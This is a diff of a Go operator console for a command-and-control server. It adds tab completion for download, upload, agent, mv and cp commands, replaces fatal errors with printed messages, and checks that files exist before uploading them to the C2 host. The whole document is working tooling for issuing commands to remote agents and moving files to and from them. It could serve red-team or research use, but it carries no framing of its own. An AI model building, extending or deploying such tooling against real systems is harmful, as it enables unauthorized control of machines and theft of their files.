@@ -61,13 +61,13 @@ func getAgents(url string) {
 
 	body, readErr := ioutil.ReadAll(resp.Body)
 	if readErr != nil {
-		log.Fatal(readErr)
+		fmt.Println(readErr)
 	}
 
 	var results []Agent
 	jsonErr := json.Unmarshal(body, &results)
 	if jsonErr != nil {
-		log.Fatal(jsonErr)
+		fmt.Println(jsonErr)
 	}
 
 	for _, d := range results {
@@ -94,17 +94,24 @@ func Start(c2 string) {
 
 	for {
 		var completer = readline.NewPrefixCompleter(
+			readline.PcItem("download",
+				readline.PcItemDynamic(listFiles(c2, agent)),
+			),
+			readline.PcItem("upload"),
+			readline.PcItem("agent",
+				readline.PcItemDynamic(listAgents(c2)),
+			),
 			readline.PcItem("cd",
 				readline.PcItemDynamic(listFiles(c2, agent)),
 			),
 			readline.PcItem("cat",
 				readline.PcItemDynamic(listFiles(c2, agent)),
 			),
-			readline.PcItem("download",
+			readline.PcItem("mv",
 				readline.PcItemDynamic(listFiles(c2, agent)),
 			),
-			readline.PcItem("agent",
-				readline.PcItemDynamic(listAgents(c2)),
+			readline.PcItem("cp",
+				readline.PcItemDynamic(listFiles(c2, agent)),
 			),
 		)
 		l, err := readline.NewEx(&readline.Config{
@@ -175,6 +182,10 @@ func Start(c2 string) {
 				file := parts[1]
 				//copy(file, "/tmp/"+uuid)
 				tempfile := uploadFile(file, c2)
+				if tempfile == "NotFound" {
+					fmt.Println("File not found")
+					break
+				}
 				cmdString = "upload " + tempfile
 				cmdid := sendCommand(cmdString, agent, c2)
 				deadline := time.Now().Add(15 * time.Second)
@@ -203,7 +214,7 @@ func Start(c2 string) {
 					path := parts[1]
 					file := filepath.Base(path)
 					downloadFile("/tmp/"+file, c2+"/files/"+file)
-					fmt.Println("Process Download" + file)
+					//fmt.Println("Process Download" + file)
 				}
 				if id == cmdid && output != "" || cmdString == "" {
 					fmt.Fprintln(os.Stderr, output)
@@ -320,13 +331,13 @@ func getOutput(url string, c2 string, cmd string) (string, string) {
 
 		body, readErr := ioutil.ReadAll(resp.Body)
 		if readErr != nil {
-			log.Fatal(readErr)
+			fmt.Println(readErr)
 		}
 
 		var results []Cmd
 		jsonErr := json.Unmarshal(body, &results)
 		if jsonErr != nil {
-			log.Fatal(jsonErr)
+			fmt.Println(jsonErr)
 		}
 
 		for _, d := range results {
@@ -360,13 +371,13 @@ func getAgentWorking(url string) string {
 
 		body, readErr := ioutil.ReadAll(resp.Body)
 		if readErr != nil {
-			log.Fatal(readErr)
+			fmt.Println(readErr)
 		}
 
 		var results Agent
 		jsonErr := json.Unmarshal(body, &results)
 		if jsonErr != nil {
-			log.Fatal(jsonErr)
+			fmt.Println(jsonErr)
 		}
 
 		//fmt.Println(results.Working)
@@ -437,57 +448,60 @@ func downloadFile(filepath string, url string) error {
 }
 
 func uploadFile(path string, c2 string) string {
-	extraParams := map[string]string{
-		"operator": "none",
-	}
-	request, err := newfileUploadRequest(c2+"/api/cmd/files", extraParams, "myFile", path)
-	if err != nil {
-		log.Fatal(err)
-	}
-	client := &http.Client{}
-	resp, err := client.Do(request)
-	if err != nil {
-		log.Fatal(err)
-	} else {
-		body := &bytes.Buffer{}
-		_, err := body.ReadFrom(resp.Body)
-		if err != nil {
-			log.Fatal(err)
+	if _, err := os.Stat(path); err == nil {
+		extraParams := map[string]string{
+			"operator": "none",
 		}
-		resp.Body.Close()
-		//fmt.Println(resp.StatusCode)
-		//fmt.Println(resp.Header)
-		fmt.Println(body.String())
-		return body.String()
+		request, err := newfileUploadRequest(c2+"/api/cmd/files", extraParams, "myFile", path)
+		if err != nil {
+			fmt.Println(err)
+		}
+		client := &http.Client{}
+		resp, err := client.Do(request)
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			body := &bytes.Buffer{}
+			_, err := body.ReadFrom(resp.Body)
+			if err != nil {
+				fmt.Println(err)
+			}
+			resp.Body.Close()
+			return body.String()
+		}
+		return "Found"
 	}
-	return ""
+	return "NotFound"
 }
 
 // Creates a new file upload http request with optional extra params
 func newfileUploadRequest(uri string, params map[string]string, paramName, path string) (*http.Request, error) {
-	file, err := os.Open(path)
-	if err != nil {
-		return nil, err
-	}
-	defer file.Close()
+	if _, err := os.Stat(path); err == nil {
+		file, err := os.Open(path)
+		if err != nil {
+			return nil, err
+		}
+		defer file.Close()
 
-	body := &bytes.Buffer{}
-	writer := multipart.NewWriter(body)
-	part, err := writer.CreateFormFile(paramName, filepath.Base(path))
-	if err != nil {
-		return nil, err
-	}
-	_, err = io.Copy(part, file)
+		body := &bytes.Buffer{}
+		writer := multipart.NewWriter(body)
+		part, err := writer.CreateFormFile(paramName, filepath.Base(path))
+		if err != nil {
+			return nil, err
+		}
+		_, err = io.Copy(part, file)
 
-	for key, val := range params {
-		_ = writer.WriteField(key, val)
-	}
-	err = writer.Close()
-	if err != nil {
-		return nil, err
-	}
+		for key, val := range params {
+			_ = writer.WriteField(key, val)
+		}
+		err = writer.Close()
+		if err != nil {
+			return nil, err
+		}
 
-	req, err := http.NewRequest("POST", uri, body)
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-	return req, err
+		req, err := http.NewRequest("POST", uri, body)
+		req.Header.Set("Content-Type", writer.FormDataContentType())
+		return req, err
+	}
+	return nil, nil
 }
